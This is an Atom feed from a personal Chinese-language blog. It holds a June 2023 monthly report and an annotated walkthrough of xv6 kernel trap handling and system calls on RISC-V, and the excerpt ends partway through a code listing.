<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Humoooor&#39;s Blog</title>
  
  
  <link href="https://humoooor.cn/atom.xml" rel="self"/>
  
  <link href="https://humoooor.cn/"/>
  <updated>2023-07-01T04:28:36.106Z</updated>
  <id>https://humoooor.cn/</id>
  
  <author>
    <name>Humoooor</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2023.06</title>
    <link href="https://humoooor.cn/2023/06/05/2023.06/"/>
    <id>https://humoooor.cn/2023/06/05/2023.06/</id>
    <published>2023-06-05T03:04:00.000Z</published>
    <updated>2023-07-01T04:28:36.106Z</updated>
    
    <content type="html"><![CDATA[<p>学习的六月</p><span id="more"></span><h2 id="Week-9-2023-06-01-2023-06-04"><a href="#Week-9-2023-06-01-2023-06-04" class="headerlink" title="Week 9 (2023.06.01 - 2023.06.04)"></a>Week 9 (2023.06.01 - 2023.06.04)</h2><p>本来想着看 xv6 的视频，结果看着看着，跑去看线程切换的源码了，算是基本搞懂了原理</p><p>把计网和通原实验做完了，还挺有意思（笑）</p><p>🏓 75 分，略低 😰</p><p>下周期望</p><ul><li>完成内容安全和智能终端安全作业</li><li>开始预习</li></ul><h2 id="Week-10-2023-06-05-2023-06-11"><a href="#Week-10-2023-06-05-2023-06-11" class="headerlink" title="Week 10 (2023.06.05 - 2023.06.11)"></a>Week 10 (2023.06.05 - 2023.06.11)</h2><p>和 Jam 复习协议和软件，Jam 好强</p><h2 id="Week-11-2023-06-12-2023-06-18"><a href="#Week-11-2023-06-12-2023-06-18" class="headerlink" title="Week 11 (2023.06.12 - 2023.06.18)"></a>Week 11 (2023.06.12 - 2023.06.18)</h2><p>考完协议和软件了捏</p><p>这 b AI 实验我是一辈子不想再做了（<del>什么 b 课都来蹭 AI，笑</del>）</p><p>换手机了，芜湖</p><h2 id="Week-12-2023-06-19-2023-06-25"><a href="#Week-12-2023-06-19-2023-06-25" class="headerlink" title="Week 12 (2023.06.19 - 2023.06.25)"></a>Week 12 (2023.06.19 - 2023.06.25)</h2><p>人工智能复习半小时，考试半小时（乐）</p><p>出去和对象玩耍，拍了好多照片，好好看🥰</p><h2 id="Week-13-2023-06-26-2023-06-30"><a href="#Week-13-2023-06-26-2023-06-30" class="headerlink" title="Week 13 (2023.06.26 - 2023.06.30)"></a>Week 13 (2023.06.26 - 2023.06.30)</h2><p>回高中看望班主任，聊了很多，开心捏</p><p>去❀上班了！</p><ul><li>入职：好激动</li><li>上班第一天：什么时候下班</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>考试搞定了</li><li>实习有着落了</li><li>高中毕业以来第一次去看老师</li></ul><h2 id="期望"><a href="#期望" class="headerlink" title="期望"></a>期望</h2><ul><li>实习好好干，多学容器安全</li><li>xv6 继续看，剖析类 Unix 内核源码（进阶：Linux 内核源码）</li><li>身体健康最重要，早睡早起</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习的六月&lt;/p&gt;</summary>
    
    
    
    <category term="MonthReport" scheme="https://humoooor.cn/categories/MonthReport/"/>
    
    
  </entry>
  
  <entry>
    <title>Xv6 剖析</title>
    <link href="https://humoooor.cn/2023/05/23/Xv6%20%E5%89%96%E6%9E%90/"/>
    <id>https://humoooor.cn/2023/05/23/Xv6%20%E5%89%96%E6%9E%90/</id>
    <published>2023-05-23T03:21:00.000Z</published>
    <updated>2023-06-01T12:32:30.182Z</updated>
    
    <content type="html"><![CDATA[<p>个人对 xv6 这个简易操作系统内核比较感兴趣，就想写一个剖析，看看 xv6 都是怎么实现这些功能的，坚持一周更一个话题</p><span id="more"></span><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>可以直接读下面的话题，这里是便于读此文章时快速了解</p><h3 id="关于-xv6"><a href="#关于-xv6" class="headerlink" title="关于 xv6"></a>关于 xv6</h3><p>xv6 是一个基于 RISC-V 64 位架构 CPU 的类 Unix 简易操作系统</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h4><table><thead><tr><th>Register</th><th>ABI Name</th><th>Description</th><th>Saver</th></tr></thead><tbody><tr><td>x0</td><td>zero</td><td>Hard-wired zero</td><td>-</td></tr><tr><td>x1</td><td>ra</td><td>Return address</td><td>Caller</td></tr><tr><td>x2</td><td>sp</td><td>Stack pointer</td><td>Callee</td></tr><tr><td>x3</td><td>gp</td><td>Global pointer</td><td>-</td></tr><tr><td>x4</td><td>tp</td><td>Thread pointer</td><td>-</td></tr><tr><td>x5-7</td><td>t0-2</td><td>Temporaries</td><td>Caller</td></tr><tr><td>x8</td><td>s0/fp</td><td>Saved register / frame pointer</td><td>Callee</td></tr><tr><td>x9</td><td>s1</td><td>Saved register</td><td>Callee</td></tr><tr><td>x10-x11</td><td>a0-1</td><td>Function arguments / return values</td><td>Caller</td></tr><tr><td>x12-x17</td><td>a2-7</td><td>Function arguments</td><td>Caller</td></tr><tr><td>x18-27</td><td>s2-11</td><td>Saved registers</td><td>Callee</td></tr><tr><td>x28-31</td><td>t3-6</td><td>Temporaries</td><td>Caller</td></tr></tbody></table><p>在汇编中一般使用寄存器的 ABI 名字</p><p>还有 f 开头的寄存器，用于浮点数，没有列举出来</p><p>ra 保存当前函数的返回地址</p><p>s0/fp、sp 用于保存栈底和栈顶，注意 s0 和 fp 是同一个寄存器</p><p>tp 保存当前 CPU 核 id</p><p>a0 还用于保存函数返回值</p><ul><li>Saver<ul><li>函数之间除了 a0 寄存器传递返回值外，应该不能互相影响，因此其他寄存器需要被保存下来，Saver 指定当前函数的寄存器是由调用函数还是被调用函数保存</li><li>Caller：调用函数<ul><li>Caller 在函数开始就可以选择 Caller 类寄存器保存下来，一般只保存 ra，具体由编译器选择</li></ul></li><li>Callee：被调用函数<ul><li>Callee 只保存它会用到的 Callee 类寄存器，在返回到 Caller 前恢复</li></ul></li><li>为什么要分开保存呢？<ul><li>Callee 类的寄存器不能确定下层函数会不会用到，而且随时会变化，每次调用函数前后都存取一遍，性能会降低很多，为了提高性能，由被调用者来保存更加合适</li></ul></li></ul></li></ul><h4 id="控制状态寄存器"><a href="#控制状态寄存器" class="headerlink" title="控制状态寄存器"></a>控制状态寄存器</h4><p>CSR（Control Status Register）</p><ul><li>pc：指向下一条将要指向指令的地址<ul><li>Program Counter</li></ul></li><li>satp：保存一级页表的物理地址<ul><li>Supervisor Address Translation and Protection</li></ul></li><li>stvec：保存发生 trap 时跳转的地址<ul><li>Supervisor Trap Vector Base Address Register</li><li>用户模式下会指向 kernel/trapmpoline.S 的 <code>uservec</code></li><li>管理者模式下会指向 kernel/kernelvec.S 的 <code>kernelvec</code></li></ul></li><li>sepc：保存发生 trap 时 pc 的值，便于返回到用户进程<ul><li>Supervisor Exception Program Counter</li><li>内核可控制 sepc 让 sret 返回到适当的位置</li></ul></li><li>scause：记录发生 trap 的原因，内核根据这个做进一步处理<ul><li>Supervisor Cause Register</li><li>8 表示系统调用</li><li>其他表示错误或者中断</li></ul></li><li>sstatus：以 bitmap 形式保存一些控制信息<ul><li>Supervisor Status Register</li><li>SPP：表示 trap 来自用户模式还是管理者模式，并用来告诉 sret 返回到哪个模式</li><li>SIE：表示在管理者模式下是否允许设备中断，0 表示禁止，RISC-V 会推迟设备中断</li></ul></li><li>sscatch：在内核态与用户态时起辅助作用<ul><li>一般用来保存 a0</li><li><del>在 xv6 的 2020 版本用来保存 trapframe 地址</del></li></ul></li></ul><h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><ul><li>csrr、csrw<ul><li>用于读写 CSR</li></ul></li><li>sfence.vma<ul><li>清空 TLB 缓存</li></ul></li><li>ecall（Environment Call）<ol><li>将模式从用户模式更改为管理者（supervisor）模式</li><li>将 pc 寄存器保存到 sepc 寄存器</li><li>将 pc 寄存器改为 stvec 寄存器值</li><li>关闭设备中断（将 sstatus 的 SIE 位设为 0）</li></ol></li><li>sret（Supervisor Return）<ol><li>将模式从管理者模式更改为指定的模式（sstatus 的 SPP 位）</li><li>将 pc 寄存器改为 sepc 寄存器值</li><li>启用设备中断（将 sstatus 的 SIE 位设为 1）</li></ol></li></ul><h3 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h3><ul><li>trampline：在内核页表和用户页表中都有映射，作为用户进程切换到内核的跳板，放在虚拟地址空间的顶部（0x3ffffff000），大小为一页</li><li>trapframe：在用户页表中有映射，用于切换到内核时保存用户进程的上下文，放在 trampoline 下面（0x3fffffe000），大小为一页</li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight c"><figcaption><span>kernel/proc.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">proc</span>;</span>          <span class="comment">// The process running on this cpu, or null.</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>     <span class="comment">// swtch() here to enter scheduler().</span></span><br><span class="line">  <span class="type">int</span> noff;                   <span class="comment">// Depth of push_off() nesting.</span></span><br><span class="line">  <span class="type">int</span> intena;                 <span class="comment">// Were interrupts enabled before push_off()?</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>proc<ul><li>保存当前 CPU 核运行的进程</li></ul></li><li>context<ul><li>保存内核用于调度功能的线程的上下文</li></ul></li></ul><h2 id="怎么在内核和用户进程间切换"><a href="#怎么在内核和用户进程间切换" class="headerlink" title="怎么在内核和用户进程间切换"></a>怎么在内核和用户进程间切换</h2><p>在 RISC-V 中，有三种 trap</p><ul><li>系统调用</li><li>硬件中断</li><li>异常</li></ul><p>在用户进程中发生 trap 时，需要陷入到内核中进行处理，处理完后内核会根据情况回到用户进程或者杀死用户进程，这其中就涉及到内核和用户进程间的切换</p><h3 id="切换过程"><a href="#切换过程" class="headerlink" title="切换过程"></a>切换过程</h3><p>发生 trap 时，硬件会执行以下操作</p><ol><li>将 sstatus 中的 SIE 位清零，禁用设备中断以防止干扰，如果这个 trap 是设备中断，不会做以下操作</li><li>将模式从用户模式更改为管理者模式</li><li>将 pc 寄存器的值复制到 sepc 寄存器中</li><li>将当前模式（用户或者管理者）保存到 sstatus 寄存器的 SPP 位</li><li>设置 scause 寄存器的值反映 trap 原因</li><li>将 stvec 寄存器的值复制到 pc 寄存器中</li></ol><p>此时 pc 指向 trampoline，开始执行，注意，此时页表寄存器并没有便，也就是说还使用着用户进程的页表</p><figure class="highlight x86asm"><figcaption><span>kernel/trapoline.S</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.globl</span> uservec</span><br><span class="line"><span class="symbol">uservec:</span></span><br><span class="line">        # 缓存 a0</span><br><span class="line">        csrw sscratch, a0</span><br><span class="line"></span><br><span class="line">        # 把 trapframe 地址放到 a0 中</span><br><span class="line">        li a0, TRAPFRAME</span><br><span class="line">        </span><br><span class="line">        # 把用户寄存器保存到 trapframe 中，kernel/proc<span class="number">.</span>h 中对应着变量地址</span><br><span class="line">        sd ra, <span class="number">40</span>(a0)</span><br><span class="line">        sd <span class="built_in">sp</span>, <span class="number">48</span>(a0)</span><br><span class="line">        # 此处省略...</span><br><span class="line">        sd t5, <span class="number">272</span>(a0)</span><br><span class="line">        sd t6, <span class="number">280</span>(a0)</span><br><span class="line"></span><br><span class="line">    # 再把原 a0 的值保存进去</span><br><span class="line">        csrr t0, sscratch</span><br><span class="line">        sd t0, <span class="number">112</span>(a0)</span><br><span class="line"></span><br><span class="line">        # 从 trapframe 中取出内核栈的指针、<span class="meta">CPU</span> 核的 id、处理 trap 的地址、内核页表</span><br><span class="line">        ld <span class="built_in">sp</span>, <span class="number">8</span>(a0)</span><br><span class="line">        ld tp, <span class="number">32</span>(a0)</span><br><span class="line">        ld t0, <span class="number">16</span>(a0)</span><br><span class="line">        ld t1, <span class="number">0</span>(a0)</span><br><span class="line"></span><br><span class="line">        # 清空 TLB 缓存，这里英文注释是说</span><br><span class="line">        <span class="keyword">sfence</span><span class="number">.</span>vma <span class="meta">zero</span>, <span class="meta">zero</span></span><br><span class="line"></span><br><span class="line">        # 切换到内核页表</span><br><span class="line">        csrw satp, t1</span><br><span class="line"></span><br><span class="line">        # 清空 TLB 缓存</span><br><span class="line">        <span class="keyword">sfence</span><span class="number">.</span>vma <span class="meta">zero</span>, <span class="meta">zero</span></span><br><span class="line"></span><br><span class="line">        # 跳转到处理 trap 的地方，也就是 kernel/trap<span class="number">.</span>c 的 usertrap 函数地址</span><br><span class="line">        jr t0</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>将用户进程的寄存器保存到 trapframe 中</li><li>切换内核栈，内核线程 id，内核页表</li><li>跳转到 kernel/trap.c 的 <code>usertrap</code> 函数</li></ol><p><code>uservec</code> 主要就是做好切换到内核的准备</p><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置 stvec 为 kernelvec，如果此时发生了 trap 会跳转到 kernelvec 进行处理</span></span><br><span class="line">  w_stvec((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 保存用户进程的 pc 到 trapframe</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = r_sepc();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(r_scause() == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="comment">// 系统调用</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = devintr()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// 设备中断</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 其他异常</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果用户进程被杀死就退出</span></span><br><span class="line">  <span class="keyword">if</span>(killed(p))</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果是计时器中断，则进行进程调度</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>把 stvec 改成 kernelvec 以处理发生在内核的 trap</li><li>保存用户进程的 pc 到 trapframe</li><li>根据 scause、devintr 处理 trap</li><li>检查是否计时器中断，若是则进行进程调度</li><li>检查进程是否被杀死，若是则退出</li><li>跳转到 <code>usertrapret</code> 函数</li></ol><p><code>usertrap</code> 主要就是根据 trap 类型处理 trap</p><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrapret</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 关闭设备中断</span></span><br><span class="line">  intr_off();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 把 uservec 的地址写入 stvec 寄存器</span></span><br><span class="line">  uint64 trampoline_uservec = TRAMPOLINE + (uservec - trampoline);</span><br><span class="line">  w_stvec(trampoline_uservec);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 保存内核页表、内核栈、usertrap 地址、CPU 核 id</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_satp = r_satp();         <span class="comment">// kernel page table</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE; <span class="comment">// process&#x27;s kernel stack</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_trap = (uint64)usertrap;</span><br><span class="line">  p-&gt;trapframe-&gt;kernel_hartid = r_tp();         <span class="comment">// hartid for cpuid()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up the registers that trampoline.S&#x27;s sret will use</span></span><br><span class="line">  <span class="comment">// to get to user space.</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置 sstatus 寄存器</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> x = r_sstatus();</span><br><span class="line">  x &amp;= ~SSTATUS_SPP; <span class="comment">// SPP 位清零，以便 sret 返回到用户模式</span></span><br><span class="line">  x |= SSTATUS_SPIE; <span class="comment">// SPIE 位置 1，允许用户模式下设备中断</span></span><br><span class="line">  w_sstatus(x);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 把用户进程的 pc 写入 sepc</span></span><br><span class="line">  w_sepc(p-&gt;trapframe-&gt;epc);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 取出用户页表</span></span><br><span class="line">  uint64 satp = MAKE_SATP(p-&gt;pagetable);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 取出 userret 地址，准备调用，并传递用户页表进去</span></span><br><span class="line">  uint64 trampoline_userret = TRAMPOLINE + (userret - trampoline);</span><br><span class="line">  ((<span class="type">void</span> (*)(uint64))trampoline_userret)(satp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>保存内核页表、内核栈、CPU 核的 id</li><li>配置 sstatus 寄存器</li><li>调用 <code>userret</code> 并传递用户页表</li></ol><p><code>usertrapret</code> 主要是处理 trap 后为返回到用户进程做准备</p><figure class="highlight x86asm"><figcaption><span>kernel/trampoline.S</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">globl userret</span><br><span class="line"><span class="symbol">userret:</span></span><br><span class="line">        # 转换到用户页表</span><br><span class="line">        <span class="keyword">sfence</span><span class="number">.</span>vma <span class="meta">zero</span>, <span class="meta">zero</span></span><br><span class="line">        csrw satp, a0</span><br><span class="line">        <span class="keyword">sfence</span><span class="number">.</span>vma <span class="meta">zero</span>, <span class="meta">zero</span></span><br><span class="line"></span><br><span class="line">        # 从 trapframe 中取出用户进程的寄存器值</span><br><span class="line">        li a0, TRAPFRAME</span><br><span class="line">        ld ra, <span class="number">40</span>(a0)</span><br><span class="line">        ld <span class="built_in">sp</span>, <span class="number">48</span>(a0)</span><br><span class="line">        # 此处省略...</span><br><span class="line">        ld t6, <span class="number">280</span>(a0)</span><br><span class="line">        ld a0, <span class="number">112</span>(a0)</span><br><span class="line">        </span><br><span class="line">        # 返回到用户模式和用户进程的 pc 所指位置</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure><p><code>userret</code> 主要是恢复用户进程的上下文，回到发生 trap 的位置（或者发生 trap 位置后面一个指令，比如 <code>ecall</code> 后面的指令）</p><h3 id="省流小结"><a href="#省流小结" class="headerlink" title="省流小结"></a>省流小结</h3><p><del>真省流吗？</del></p><p>用户进程 -&gt; <code>uservec</code> -&gt; <code>usertrap</code> -&gt; <code>usertrapret</code> -&gt; <code>userret</code> -&gt; 用户进程</p><ol><li>发生 trap 时，程序会跳转到 stvec 寄存器指向的 kernel/trampoline.S 中的 <code>uservec</code> 保存用户进程的上下文，并设置内核栈、内核线程 id、内核页表</li><li>然后跳转到 kernel/trap.c 中的 <code>usertrap</code> 对 trap 进行处理</li><li>如果要恢复到用户进程，会跳转到 kernel/trap.c 的 <code>usertrapret</code> 为返回到用户进程做准备</li><li>最后跳转到 kernel/trampoline.S 中的 <code>userret</code> 恢复用户进程上下文，回到发生 trap 的位置（或者发生 trap 位置后面一个指令，比如 <code>ecall</code> 后面的指令）</li></ol><h2 id="怎么实现系统调用"><a href="#怎么实现系统调用" class="headerlink" title="怎么实现系统调用"></a>怎么实现系统调用</h2><p>在 user/user.h 我们可以看到系统调用函数的声明</p><figure class="highlight c"><figcaption><span>user/user.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span>)</span> __<span class="title function_">attribute__</span><span class="params">((<span class="keyword">noreturn</span>))</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="type">void</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span>, <span class="type">void</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>那么，就有一个问题，系统调用明明是要用 <code>ecall</code> 来使用，xv6 是怎么把系统调用做成一个函数，使得用户程序像调用函数那样调用系统调用？</p><h3 id="怎么制作用户系统调用函数"><a href="#怎么制作用户系统调用函数" class="headerlink" title="怎么制作用户系统调用函数"></a>怎么制作用户系统调用函数</h3><p>我们可以在 user/usys.S 看到系统调用函数在汇编中的定义</p><figure class="highlight x86asm"><figcaption><span>user/usys.S</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="string">&quot;kernel/syscall.h&quot;</span></span><br><span class="line"><span class="meta">.global</span> fork</span><br><span class="line"><span class="symbol">fork:</span></span><br><span class="line"> li a7, SYS_fork</span><br><span class="line"> ecall</span><br><span class="line"> <span class="keyword">ret</span></span><br><span class="line"><span class="meta">.global</span> exit</span><br><span class="line"><span class="symbol">exit:</span></span><br><span class="line"> li a7, SYS_exit</span><br><span class="line"> ecall</span><br><span class="line"> <span class="keyword">ret</span></span><br><span class="line"><span class="meta">.global</span> wait</span><br><span class="line"><span class="symbol">wait:</span></span><br><span class="line"> li a7, SYS_wait</span><br><span class="line"> ecall</span><br><span class="line"> <span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以观察到，每一个系统调用函数都只是将系统调用号传递给 a7，然后使用 <code>ecall</code> 调用系统调用，最后返回到上一层函数</p><p>而参数传递是用户程序在调用系统调用函数之前，会根据函数声明将参数传递给对应的寄存器，然后跳转到系统调用函数的地址执行</p><p>这个 user/usys.S 文件其实是一个 perl 脚本 user/usys.pl 生成的，便于添加系统调用</p><p>好的，上面解释了系统调用函数的实现，下面就看看 <code>ecall</code> 到底做了什么来请求内核完成系统调用</p><h3 id="怎么请求内核完成系统调用"><a href="#怎么请求内核完成系统调用" class="headerlink" title="怎么请求内核完成系统调用"></a>怎么请求内核完成系统调用</h3><p><code>ecall</code> 是由用户进程主动陷入 trap 请求内核完成系统调用的汇编指令</p><p>它会使 scause 寄存器值设为 8，在 RISC-V 中它代表着系统调用</p><p>在切换到内核态后，跳转到 kernel/trap.c 的 <code>usertrap</code></p><p>我们仔细看看 kernel/trap.c 的 <code>usertrap</code> 怎么处理系统调用的</p><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当检查到 trap 原因是系统调用时</span></span><br><span class="line">  <span class="keyword">if</span>(r_scause() == <span class="number">8</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先检查用户进程是否被杀死</span></span><br><span class="line">    <span class="keyword">if</span>(killed(p))</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把 epc 加 4，因为我们不想返回到用户进程时再去执行一次 ecall</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启用设备中断</span></span><br><span class="line">    intr_on();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始处理系统调用</span></span><br><span class="line">    syscall();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>usertrap</code> 检查到是系统调用时，将 epc 的值加 4，以便返回时执行 <code>ecall</code> 后面的指令，然后跳转到处理系统调用的函数 <code>syscall</code></p><figure class="highlight c"><figcaption><span>kernel/syscall.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 